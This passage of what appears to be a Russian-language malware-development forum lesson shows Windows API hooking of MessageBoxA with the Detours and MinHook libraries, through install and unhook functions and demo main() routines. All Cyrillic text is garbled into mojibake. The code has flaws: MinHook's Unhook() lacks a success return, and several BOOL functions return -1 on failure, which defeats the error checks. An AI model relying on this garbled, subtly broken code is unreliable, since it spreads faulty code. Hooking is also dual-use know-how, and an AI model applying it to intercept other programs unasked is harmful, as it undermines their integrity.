    if ((dwDetoursErr = DetourUpdateThread(GetCurrentThread())) != NO_ERROR) {
        printf(&quot;[!] DetourUpdateThread –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å –æ—à–∏–±–∫–æ–π —Å –∫–æ–¥–æ–º : %d \n&quot;, dwDetoursErr);
        return FALSE;
    }

      // –£–¥–∞–ª–µ–Ω–∏–µ —Ö—É–∫–∞ –∏–∑ MessageBoxA
    if ((dwDetoursErr = DetourDetach((PVOID)&amp;g_pMessageBoxA, MyMessageBoxA)) != NO_ERROR) {
        printf(&quot;[!] DetourDetach –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å –æ—à–∏–±–∫–æ–π —Å –∫–æ–¥–æ–º : %d \n&quot;, dwDetoursErr);
        return FALSE;
    }

      // –§–∞–∫—Ç–∏—á–µ—Å–∫–æ–µ —É–¥–∞–ª–µ–Ω–∏–µ —Ö—É–∫–∞ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –ø–æ—Å–ª–µ `DetourTransactionCommit` - –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
    if ((dwDetoursErr = DetourTransactionCommit()) != NO_ERROR) {
        printf(&quot;[!] DetourTransactionCommit –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å –æ—à–∏–±–∫–æ–π —Å –∫–æ–¥–æ–º : %d \n&quot;, dwDetoursErr);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è</b><br />
<br />
–†–∞–Ω–µ–µ –ø–æ–∫–∞–∑–∞–Ω–Ω—ã–µ –ø—Ä–æ—Ü–µ–¥—É—Ä—ã —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –∏ —É–¥–∞–ª–µ–Ω–∏—è —Ö—É–∫–∞ –Ω–µ –≤–∫–ª—é—á–∞—é—Ç –≤ —Å–µ–±—è –æ—Å–Ω–æ–≤–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é. –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∞ –Ω–∏–∂–µ, –≤ –Ω–µ–π –ø—Ä–æ—Å—Ç–æ –≤—ã–∑—ã–≤–∞—é—Ç—Å—è –ø–æ–¥—Ü–µ–ø–ª–µ–Ω–Ω—ã–µ –∏ –Ω–µ –ø–æ–¥—Ü–µ–ø–ª–µ–Ω–Ω—ã–µ –≤–µ—Ä—Å–∏–∏ MessageBoxA.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>int main() {

    // –ë—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–æ - –Ω–µ –ø–æ–¥—Ü–µ–ø–ª–µ–Ω–æ
    MessageBoxA(NULL, &quot;–ß—Ç–æ –≤—ã –¥—É–º–∞–µ—Ç–µ –æ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º?&quot;, &quot;–û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ&quot;, MB_OK | MB_ICONQUESTION);

//------------------------------------------------------------------
    //  –£—Å—Ç–∞–Ω–æ–≤–∫–∞ —Ö—É–∫–∞
    if (!InstallHook())
        return -1;

//------------------------------------------------------------------
    // –ù–µ –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–æ - –±—É–¥–µ—Ç –∑–∞–ø—É—â–µ–Ω–∞ —Ñ—É–Ω–∫—Ü–∏—è MyMessageBoxA –≤–º–µ—Å—Ç–æ —ç—Ç–æ–≥–æ
    MessageBoxA(NULL, &quot;–†–∞–∑—Ä–∞–±–æ—Ç–∫–∞ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º - —ç—Ç–æ –ø–ª–æ—Ö–æ&quot;, &quot;–û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ&quot;, MB_OK | MB_ICONWARNING);

//------------------------------------------------------------------
    //  –£–¥–∞–ª–µ–Ω–∏–µ —Ö—É–∫–∞
    if (!Unhook())
        return -1;

//------------------------------------------------------------------
    //  –ë—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–æ - —Ö—É–∫ —É–¥–∞–ª–µ–Ω
    MessageBoxA(NULL, &quot;–°–Ω–æ–≤–∞ –æ–±—ã—á–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ&quot;, &quot;–û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ&quot;, MB_OK | MB_ICONINFORMATION);

      return 0;
}</code></pre>
	</div>
</div><br />
<b>–î–µ–º–æ<br />
<br />
MessageBoxA (Unhooked)</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785204088.png"
		data-src="https://osint42.org/attachments/1746785204088-png.194/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785204088-png.194/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785204088.png"
			title="1746785204088.png"
			width="1409" height="855" loading="lazy" />
	</div><br />
<br />
<b>MessageBoxA (Hooked)</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785211187.png"
		data-src="https://osint42.org/attachments/1746785211187-png.195/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785211187-png.195/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785211187.png"
			title="1746785211187.png"
			width="1449" height="708" loading="lazy" />
	</div><br />
<br />
<b>MessageBoxA (Unhooked)</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785217820.png"
		data-src="https://osint42.org/attachments/1746785217820-png.196/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785217820-png.196/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785217820.png"
			title="1746785217820.png"
			width="1370" height="828" loading="lazy" />
	</div><br />
<br />
<b>–ë–∏–±–ª–∏–æ—Ç–µ–∫–∞ Minhook</b><br />
<br />
<a href="https://github.com/TsudaKageyu/minhook" target="_blank" class="link link--external" rel="noopener">Minhook</a> - —ç—Ç–æ –±–∏–±–ª–∏–æ—Ç–µ–∫–∞ –¥–ª—è —Ö—É–∫–∏–Ω–≥–∞, –Ω–∞–ø–∏—Å–∞–Ω–Ω–∞—è –Ω–∞ C, –∫–æ—Ç–æ—Ä–∞—è –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∞ –¥–ª—è –¥–æ—Å—Ç–∏–∂–µ–Ω–∏—è API-—Ö—É–∫–∏–Ω–≥–∞. –û–Ω–∞ —Å–æ–≤–º–µ—Å—Ç–∏–º–∞ –∫–∞–∫ —Å 32-–±–∏—Ç–Ω—ã–º–∏, —Ç–∞–∫ –∏ —Å 64-–±–∏—Ç–Ω—ã–º–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è–º–∏ –Ω–∞ Windows –∏ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –∞—Å—Å–µ–º–±–ª–µ—Ä x86/x64 –¥–ª—è –≤–Ω—É—Ç—Ä–µ–Ω–Ω–µ–≥–æ —Ö—É–∫–∏–Ω–≥–∞, –∞–Ω–∞–ª–æ–≥–∏—á–Ω–æ –±–∏–±–ª–∏–æ—Ç–µ–∫–µ Detours. –ü–æ —Å—Ä–∞–≤–Ω–µ–Ω–∏—é —Å –¥—Ä—É–≥–∏–º–∏ –±–∏–±–ª–∏–æ—Ç–µ–∫–∞–º–∏ —Ö—É–∫–∏–Ω–≥–∞, MinHook –ø—Ä–æ—â–µ –∏ –ø—Ä–µ–¥–ª–∞–≥–∞–µ—Ç –ª–µ–≥–∫–æ–≤–µ—Å–Ω—ã–µ API, —á—Ç–æ –¥–µ–ª–∞–µ—Ç —Ä–∞–±–æ—Ç—É —Å –Ω–µ–π –ø—Ä–æ—â–µ.<br />
<br />
<b>–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ Minhook</b><br />
<br />
–ö–∞–∫ –∏ –±–∏–±–ª–∏–æ—Ç–µ–∫–∞ Detours, –±–∏–±–ª–∏–æ—Ç–µ–∫–∞ Minhook —Ç—Ä–µ–±—É–µ—Ç —Å—Ç–∞—Ç–∏—á–µ—Å–∫–∏–π .lib —Ñ–∞–π–ª –∏ –∑–∞–≥–æ–ª–æ–≤–æ—á–Ω—ã–π —Ñ–∞–π–ª MinHook.h, –∫–æ—Ç–æ—Ä—ã–µ –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å –≤–∫–ª—é—á–µ–Ω—ã –≤ –ø—Ä–æ–µ–∫—Ç Visual Studio.<br />
<br />
<b>–§—É–Ω–∫—Ü–∏–∏ API Minhook</b><br />
<br />
–ë–∏–±–ª–∏–æ—Ç–µ–∫–∞ Minhook —Ä–∞–±–æ—Ç–∞–µ—Ç, –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É—è —Å—Ç—Ä—É–∫—Ç—É—Ä—É, –∫–æ—Ç–æ—Ä–∞—è —Å–æ–¥–µ—Ä–∂–∏—Ç –Ω–µ–æ–±—Ö–æ–¥–∏–º—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é, –Ω–µ–æ–±—Ö–æ–¥–∏–º—É—é –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –∏–ª–∏ —É–¥–∞–ª–µ–Ω–∏—è —Ö—É–∫–∞.<br />
–≠—Ç–æ –¥–µ–ª–∞–µ—Ç—Å—è —á–µ—Ä–µ–∑ API MH_Initialize, –∫–æ—Ç–æ—Ä—ã–π –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ—Ç —Å—Ç—Ä—É–∫—Ç—É—Ä—É HOOK_ENTRY –≤ –±–∏–±–ª–∏–æ—Ç–µ–∫–µ. –ó–∞—Ç–µ–º –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Ñ—É–Ω–∫—Ü–∏—è MH_CreateHook –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Ö—É–∫–æ–≤, –∏ MH_EnableHook –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –∏—Ö –∞–∫—Ç–∏–≤–∞—Ü–∏–∏. MH_DisableHook –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è —Ö—É–∫–æ–≤, –∏, –Ω–∞–∫–æ–Ω–µ—Ü, MH_Uninitialize –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –æ—á–∏—Å—Ç–∫–∏ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–æ–π —Å—Ç—Ä—É–∫—Ç—É—Ä—ã.<br />
<br />
–§—É–Ω–∫—Ü–∏–∏ –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω—ã –Ω–∏–∂–µ –¥–ª—è —É–¥–æ–±—Å—Ç–≤–∞:<br />
<br />
MH_Initialize - –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å—Ç—Ä—É–∫—Ç—É—Ä—ã HOOK_ENTRY.<br />
<br />
MH_CreateHook - –°–æ–∑–¥–∞–Ω–∏–µ —Ö—É–∫–æ–≤.<br />
<br />
MH_EnableHook - –ê–∫—Ç–∏–≤–∞—Ü–∏—è —Å–æ–∑–¥–∞–Ω–Ω—ã—Ö —Ö—É–∫–æ–≤.<br />
<br />
MH_DisableHook - –£–¥–∞–ª–µ–Ω–∏–µ —Ö—É–∫–æ–≤.<br />
<br />
MH_Uninitialize - –û—á–∏—Å—Ç–∫–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–æ–π —Å—Ç—Ä—É–∫—Ç—É—Ä—ã.<br />
<br />
API Minhook –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –∑–Ω–∞—á–µ–Ω–∏–µ MH_STATUS, –∫–æ—Ç–æ—Ä–æ–µ —è–≤–ª—è–µ—Ç—Å—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–º –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏–µ–º, —Ä–∞—Å–ø–æ–ª–æ–∂–µ–Ω–Ω—ã–º –≤ Minhook.h. –í–æ–∑–≤—Ä–∞—â–∞–µ–º—ã–π —Ç–∏–ø –¥–∞–Ω–Ω—ã—Ö MH_STATUS —É–∫–∞–∑—ã–≤–∞–µ—Ç –∫–æ–¥ –æ—à–∏–±–∫–∏ —É–∫–∞–∑–∞–Ω–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏. –ó–Ω–∞—á–µ–Ω–∏–µ MH_OK, –∫–æ—Ç–æ—Ä–æ–µ —Ä–∞–≤–Ω–æ 0, –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç—Å—è, –µ—Å–ª–∏ —Ñ—É–Ω–∫—Ü–∏—è –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è —É—Å–ø–µ—à–Ω–æ, –∏ –Ω–µ–Ω—É–ª–µ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç—Å—è –≤ —Å–ª—É—á–∞–µ –æ—à–∏–±–∫–∏.<br />
<br />
<b>–°—Ç–æ–∏—Ç –æ—Ç–º–µ—Ç–∏—Ç—å, —á—Ç–æ —Ñ—É–Ω–∫—Ü–∏–∏ MH_Initialize –∏ MH_Uninitialize —Å–ª–µ–¥—É–µ—Ç –≤—ã–∑—ã–≤–∞—Ç—å —Ç–æ–ª—å–∫–æ –æ–¥–∏–Ω —Ä–∞–∑, –≤ –Ω–∞—á–∞–ª–µ –∏ –≤ –∫–æ–Ω—Ü–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ.<br />
<br />
–§—É–Ω–∫—Ü–∏—è –ø–æ–¥–º–µ–Ω—ã (–∫–æ—Ç–æ—Ä–∞—è –±—É–¥–µ—Ç –≤—ã–∑—ã–≤–∞—Ç—å—Å—è –≤–º–µ—Å—Ç–æ API)</b><br />
–ó–¥–µ—Å—å —Ç–æ—Ç –∂–µ –ø—Ä–∏–º–µ—Ä API MessageBoxA –∏–∑ –ø—Ä–µ–¥—ã–¥—É—â–µ–≥–æ –º–æ–¥—É–ª—è, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç –ø–æ–¥–º–µ–Ω—è—Ç—å—Å—è –∏ –∏–∑–º–µ–Ω—è—Ç—å—Å—è –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –¥—Ä—É–≥–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>fnMessageBoxA g_pMessageBoxA = NULL;

INT WINAPI MyMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
printf(&quot;[+] –û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã : \n&quot;);
printf(&quot;\t - lpText    : %s\n&quot;, lpText);
printf(&quot;\t - lpCaption    : %s\n&quot;, lpCaption);

return g_pMessageBoxA(hWnd, &quot;–†–∞–∑–Ω—ã–π lpText&quot;, &quot;–†–∞–∑–Ω—ã–π lpCaption&quot;, uType);
}</code></pre>
	</div>
</div><br />
–û–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ, —á—Ç–æ –≥–ª–æ–±–∞–ª—å–Ω–∞—è –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è g_pMessageBoxA –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –∑–∞–ø—É—Å–∫–∞ –æ–∫–Ω–∞ —Å–æ–æ–±—â–µ–Ω–∏–π, –≥–¥–µ g_pMessageBoxA - —ç—Ç–æ —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π, –Ω–µ –ø–æ–¥–º–µ–Ω–µ–Ω–Ω—ã–π API MessageBoxA. –ï–π –ø—Ä–∏—Å–≤–∞–∏–≤–∞–µ—Ç—Å—è –∑–Ω–∞—á–µ–Ω–∏–µ NULL, –ø–æ—Ç–æ–º—É —á—Ç–æ –≤—ã–∑–æ–≤ API Minhook MH_CreateHook –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ—Ç –µ–≥–æ –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è, –≤ –æ—Ç–ª–∏—á–∏–µ –æ—Ç –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ Detours, –≥–¥–µ g_pMessageBoxA —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è –≤—Ä—É—á–Ω—É—é. –≠—Ç–æ –¥–µ–ª–∞–µ—Ç—Å—è –¥–ª—è –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏—è –≤–æ–∑–Ω–∏–∫–Ω–æ–≤–µ–Ω–∏—è –ø—Ä–æ–±–ª–µ–º—ã —Ü–∏–∫–ª–∞ —Ö—É–∫–∏–Ω–≥–∞, –æ –∫–æ—Ç–æ—Ä–æ–π –≥–æ–≤–æ—Ä–∏–ª–æ—Å—å –≤ –ø—Ä–µ–¥—ã–¥—É—â–µ–º –º–æ–¥—É–ª–µ.<br />
<br />
<b>–ü—Ä–æ—Ü–µ–¥—É—Ä–∞ —Ö—É–∫–∏–Ω–≥–∞ Minhook</b><br />
<br />
–ö–∞–∫ —É–ø–æ–º–∏–Ω–∞–ª–æ—Å—å —Ä–∞–Ω–µ–µ, —á—Ç–æ–±—ã –ø–æ–¥–º–µ–Ω–∏—Ç—å –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–π API —Å –ø–æ–º–æ—â—å—é Minhook, —Å–Ω–∞—á–∞–ª–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –≤—ã–ø–æ–ª–Ω–∏—Ç—å —Ñ—É–Ω–∫—Ü–∏—é MH_Initialize. –ó–∞—Ç–µ–º –º–æ–∂–Ω–æ —Å–æ–∑–¥–∞—Ç—å —Ö—É–∫–∏ —Å –ø–æ–º–æ—â—å—é MH_CreateHook –∏ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞—Ç—å –∏—Ö —Å –ø–æ–º–æ—â—å—é MH_EnableHook.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL InstallHook() {

DWORD     dwMinHookErr = NULL;

if ((dwMinHookErr = MH_Initialize()) != MH_OK) {
    printf(&quot;[!] MH_Initialize –∑–∞–≤–µ—Ä—à–∏–ª—Å—è —Å –æ—à–∏–±–∫–æ–π : %d \n&quot;, dwMinHookErr);
    return FALSE;
}

// –£—Å—Ç–∞–Ω–æ–≤–∫–∞ —Ö—É–∫–∞ –Ω–∞ MessageBoxA, —á—Ç–æ–±—ã –∑–∞–ø—É—Å–∫–∞—Ç—å MyMessageBoxA –≤–º–µ—Å—Ç–æ –Ω–µ–≥–æ
// g_pMessageBoxA –±—É–¥–µ—Ç —É–∫–∞–∑–∞—Ç–µ–ª–µ–º –Ω–∞ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é MessageBoxA
if ((dwMinHookErr = MH_CreateHook(&amp;MessageBoxA, &amp;MyMessageBoxA, &amp;g_pMessageBoxA)) != MH_OK) {
    printf(&quot;[!] MH_CreateHook –∑–∞–≤–µ—Ä—à–∏–ª—Å—è —Å –æ—à–∏–±–∫–æ–π : %d \n&quot;, dwMinHookErr);
    return FALSE;
}

// –ê–∫—Ç–∏–≤–∞—Ü–∏—è —Ö—É–∫–∞ –Ω–∞ MessageBoxA
if ((dwMinHookErr = MH_EnableHook(&amp;MessageBoxA)) != MH_OK) {
    printf(&quot;[!] MH_EnableHook –∑–∞–≤–µ—Ä—à–∏–ª—Å—è —Å –æ—à–∏–±–∫–æ–π : %d \n&quot;, dwMinHookErr);
    return -1;
}

return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–ü—Ä–æ—Ü–µ–¥—É—Ä–∞ –æ—Ç–º–µ–Ω—ã —Ö—É–∫–∏–Ω–≥–∞ Minhook</b><br />
<br />
–í –æ—Ç–ª–∏—á–∏–µ –æ—Ç –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ Detours, –±–∏–±–ª–∏–æ—Ç–µ–∫–∞ Minhook –Ω–µ —Ç—Ä–µ–±—É–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π. –í–º–µ—Å—Ç–æ —ç—Ç–æ–≥–æ, —á—Ç–æ–±—ã —É–¥–∞–ª–∏—Ç—å —Ö—É–∫, –µ–¥–∏–Ω—Å—Ç–≤–µ–Ω–Ω–æ–µ —Ç—Ä–µ–±–æ–≤–∞–Ω–∏–µ - —ç—Ç–æ –∑–∞–ø—É—Å—Ç–∏—Ç—å API MH_DisableHook —Å –∞–¥—Ä–µ—Å–æ–º –ø–æ–¥–º–µ–Ω–µ–Ω–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏. –í—ã–∑–æ–≤ MH_Uninitialize –Ω–µ–æ–±—è–∑–∞—Ç–µ–ª–µ–Ω, –Ω–æ –æ–Ω –æ—á–∏—â–∞–µ—Ç —Å—Ç—Ä—É–∫—Ç—É—Ä—É, –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—É—é –ø—Ä–µ–¥—ã–¥—É—â–∏–º –≤—ã–∑–æ–≤–æ–º MH_Initialize.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL Unhook() {

DWORD     dwMinHookErr = NULL;

if ((dwMinHookErr = MH_DisableHook(&amp;MessageBoxA)) != MH_OK) {
    printf(&quot;[!] MH_DisableHook –∑–∞–≤–µ—Ä—à–∏–ª—Å—è —Å –æ—à–∏–±–∫–æ–π : %d \n&quot;, dwMinHookErr);
    return -1;
}

if ((dwMinHookErr = MH_Uninitialize()) != MH_OK) {
    printf(&quot;[!] MH_Uninitialize –∑–∞–≤–µ—Ä—à–∏–ª—Å—è —Å –æ—à–∏–±–∫–æ–π : %d \n&quot;, dwMinHookErr);
    return -1;
}
}</code></pre>
	</div>
</div><br />
<b>–ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è</b><br />
<br />
–†–∞–Ω–µ–µ –ø–æ–∫–∞–∑–∞–Ω–Ω—ã–µ –ø—Ä–æ—Ü–µ–¥—É—Ä—ã —Ö—É–∫–∏–Ω–≥–∞ –∏ –æ—Ç–º–µ–Ω—ã —Ö—É–∫–∏–Ω–≥–∞ –Ω–µ –≤–∫–ª—é—á–∞—é—Ç –≥–ª–∞–≤–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é. –ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∞ –Ω–∏–∂–µ, –æ–Ω–∞ –ø—Ä–æ—Å—Ç–æ –≤—ã–∑—ã–≤–∞–µ—Ç –ø–æ–¥–º–µ–Ω–µ–Ω–Ω—ã–µ –∏ –Ω–µ –ø–æ–¥–º–µ–Ω–µ–Ω–Ω—ã–µ –≤–µ—Ä—Å–∏–∏ MessageBoxA.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>int main() {

// –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è
MessageBoxA(NULL, &quot;–ß—Ç–æ –≤—ã –¥—É–º–∞–µ—Ç–µ –æ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º?&quot;, &quot;–û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ&quot;, MB_OK | MB_ICONQUESTION);

// –ø–æ–¥–º–µ–Ω–∞
if (!InstallHook())
    return -1;

// –Ω–µ –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è - –ø–æ–¥–º–µ–Ω–µ–Ω–æ
MessageBoxA(NULL, &quot;–†–∞–∑—Ä–∞–±–æ—Ç–∫–∞ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º - —ç—Ç–æ –ø–ª–æ—Ö–æ&quot;, &quot;–û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ&quot;, MB_OK | MB_ICONWARNING);

// –æ—Ç–º–µ–Ω–∞ –ø–æ–¥–º–µ–Ω—ã
if (!Unhook())
    return -1;

// –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è - —Ö—É–∫ –æ—Ç–∫–ª—é—á–µ–Ω
MessageBoxA(NULL, &quot;–°–Ω–æ–≤–∞ –æ–±—ã—á–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ&quot;, &quot;–û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ&quot;, MB_OK | MB_ICONINFORMATION);

return 0;
}</code></pre>
	</div>
</div><br />
<b>API Hooking - –°–æ–±—Å—Ç–≤–µ–Ω–Ω—ã–π –∫–æ–¥<br />
<br />
–í–≤–µ–¥–µ–Ω–∏–µ</b><br />
<br />
